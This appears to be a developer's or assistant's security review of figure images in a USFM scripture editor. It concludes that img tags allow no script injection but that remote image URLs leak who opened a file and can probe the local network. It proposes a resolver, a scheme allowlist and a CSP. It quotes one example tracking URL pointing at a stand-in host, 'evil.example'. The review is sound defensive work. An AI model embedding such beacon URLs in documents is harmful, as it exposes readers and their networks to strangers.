> Do we need to worry about xss with img tags btw?

## The answer

**Script injection: no.** The figure's picture is built with the DOM, not HTML
(`FigureWidget` in `packages/editor/src/core/paint/decorations.ts`: `createElement("img")`, then
`image.src`; labels and tooltips through `textContent` and `title`). Nothing in the editor package
or Sefer uses `innerHTML`. A hostile `src` cannot run code from an `<img>`: browsers do not run a
`javascript:` URL there, and an SVG loaded as an image runs no script. Attribute values in the
popover are set through `input.value`.

**The fetch itself is the risk.** A USFM file is untrusted input: it comes from git, or someone
else's project. `\fig … |src="https://evil.example/t.gif?id=…"\fig*` would make the app fetch that
URL as soon as the verse scrolls into view. That tells a stranger who opened the file, from where
and when, and it lets a document make GET requests to the local network (`http://192.168.1.1/…`,
`http://localhost:…`). On desktop nothing narrows it: Tauri's CSP is off (`"csp": null` in
`src-tauri/tauri.conf.json`).

## Where it stands

- **The editor package fetches nothing on its own.** With no `resolveSource` a figure draws a frame
  (`recipes/figures.ts`, `core/figures.ts`'s `figureSource`).
- **Only the editor bench resolves a `src`,** and it passes URLs through as they are. Right for a
  demo, wrong for Sefer.
- **Sefer passes no resolver yet,** so today it fetches nothing.

## What to do

<Followup id="project-local">**Sefer's resolver resolves project-local pictures only:** a figure's
`src` names a file in the project (its illustrations folder), read through the `FileSystem` port
and served as a `blob:` URL. A raw remote URL in a document is never fetched. Remote pictures, if
ever wanted, are a setting the user turns on, per project.</Followup>

<Followup id="scheme-allowlist">**Defence in depth in the package:** `FigureWidget` accepts only
`blob:`, `https:` and `data:image/` URLs from a resolver and draws the frame for anything else, so
a careless host resolver cannot point an `<img>` at `http:` (the local network) or `file:`.
A few lines in `core/decorations.ts`.</Followup>

<Followup id="desktop-csp">**A Content Security Policy for desktop,** with a tight `img-src`
(`'self' blob: data:`), and the same thinking for the Web build. Broader than figures: everything
the app loads falls under it, so it wants its own pass and a check that nothing legitimate
breaks (the Galley wasm, fonts, the OTLP proxy in dev).</Followup>

shared illustrations server), or are pictures always files in the project?</Question>
